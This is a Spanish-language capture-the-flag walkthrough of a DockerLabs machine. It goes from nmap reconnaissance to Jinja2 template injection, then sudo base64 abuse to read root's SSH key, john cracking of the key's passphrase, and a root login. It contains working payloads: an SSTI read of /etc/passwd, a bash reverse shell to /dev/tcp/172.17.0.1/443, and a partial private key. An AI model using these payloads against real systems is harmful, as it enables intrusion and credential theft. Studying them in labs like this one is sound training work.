Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #ssti #password-cracking

![](../assets/Pasted image 20251110164053.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad
```bash
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.224 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.224/0.224/0.224/0.000 ms
```

- Por el ttl asumo que es una maquina linux

Ahora realizo un escaneo con nmap para ver que puertos están abiertos:
```bash
> nmap -p- -sS --open -Pn -n --min-rate 5000 172.17.0.2
------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 16:46 CST
Nmap scan report for 172.17.0.2
Host is up (0.000010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown
MAC Address: 06:72:90:D3:81:3F (Unknown)
```

- Puerto 80 HTTP, 22 SSH y 8089

Procedo a realizar un segundo escaneo sobre los puertos abiertos para descubrir las versiones y servicios que están corriendo.
```bash
> nmap -p 22,80,8089 -sCV -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2 -oN target.txt
---------------------------------------------------------------------------------------
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKZZ30gHh3MJnOlBFsClzY4+XLHLM3yZHnYGk0bNxNPPQtaojCxlQAjpM4uWPkVKLWDJQ53wQ/HIeaaqsE7n8Fs=
|   256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgwRMztrUMxAvJeiwbmls3FFWnEj11lPMbqFIDUorc2
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
8089/tcp open  unknown syn-ack ttl 64
| fingerprint-strings: 
```

- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u2
- Puerto 80 HTTP: Apache httpd 2.4.59
- Puerto 8089: No pudo detectar el servicio que corre 



## Enumeración

**Puerto 80**

- Pagina default de apache, nada interesante

**Puerto 8089**

Al momento de acceder por el navegador al puerto 8089 me encuentro con una pagina web. Por lo cual decido usar whatweb para identificar que tecnologías corre por detras.

- La web corre con Python 3.11.2 
```bash
> whatweb http://172.17.0.2:8089/
http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
```

![](../assets/Pasted image 20251110165559.png)

- Probando la app me doy cuenta que el input del usuario se ve reflejado en la web.
- El parametro ?user= si lo cambiamos también se ve reflejado en la web.
![](../assets/Pasted image 20251110165824.png)

Sabiendo que la web corre en python y el input del usuario se ve reflejado y es lo único que cambia de manera dinámica en la web, esto me hace pensar que puede que por detrás haya un framework como Flask o Django que emplee algún motor plantillas cono Jinja2 u otro que pueda ser vulnerable a SSTI.

## Explotación

Lo primero que intentamos fue cambiar el parametro `?user=` por una operatoria simple para comprobar si la web la interpretaba y realizaba correctamente.

`{{7*7}}`

![](../assets/Pasted image 20251110170230.png)

Ahora sabiendo que en efecto la web es vulnerable a SSTI y que corre en Python mi primer approach fue buscar payloads que me permitieran leer archivos internos como /etc/passwd que sirvieran para el motor de plantillas de Jinja2.
```python
> {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Aquí me di cuenta que existe un usuario llamado _verde_
![](../assets/Pasted image 20251110170620.png)

Ahora procedí a denuevo buscar algún payload pero ahora que me permitiera entablarme una reverse shell.

```bash
> {{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"', shell=True) }}
```

![](../assets/Pasted image 20251110171843.png)

Me pongo en escucha:
```bash
> sudo nc -nlvp 443
```

Ejecuto el payload y obtengo acceso.
```bash
verde@d56c80ae05a3:~$ whoami
verde
verde@d56c80ae05a3:~$ id
uid=1000(verde) gid=1000(verde) groups=1000(verde)
```
## Escalada de Privilegios

Dentro del sistema lo primero que hago es enumerar los binarios con privilegios de SUDO o algun otro usuario.

- Binario bas64

```bash
verde@d56c80ae05a3:~$ sudo -l
User verde may run the following commands on d56c80ae05a3:
    (root) NOPASSWD: /usr/bin/base64
```


Anteriormente en la fase de reconocimiento descubrimos que el puerto 22 estaba abierto.

Entonces es posible que el usuario root tenga una clave `rsa` a la cual yo puedo acceder aprovechandome del binario `base64`. Bascimante voy a codificar la clave y decodificarla como el usario root.
```bash
> sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAHul0xZQ
r68d1eRBMAoL1IAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBB
VRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KME
```

Ahora procedo a guardarme la clave en mi sistema y darle permisos

- Aqui me doy cuenta de que tiene contraseña
```bash
> chmod 600 root-key
> ssh -i root-key root@172.17.0.2
Enter passphrase for key 'root-key': 
```

Por lo cual ahora procedo a tratar de romper la contraseña john
```bash
> ssh2john root-key > hash
> sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
> sudo john --show hash
root-key:honda1
```

![](../assets/Pasted image 20251110175319.png)

- Encuentro la clave: root-key:honda1

Ahora simplemente me conecto con la clave rsa y contraseña
```bash
> ssh -i root-key root@172.17.0.2
Enter passphrase for key 'root-key': 
root@d56c80ae05a3:~# whoami
root
root@d56c80ae05a3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@d56c80ae05a3:~# 
```
![](../assets/Pasted image 20251110175431.png)

***PWNED**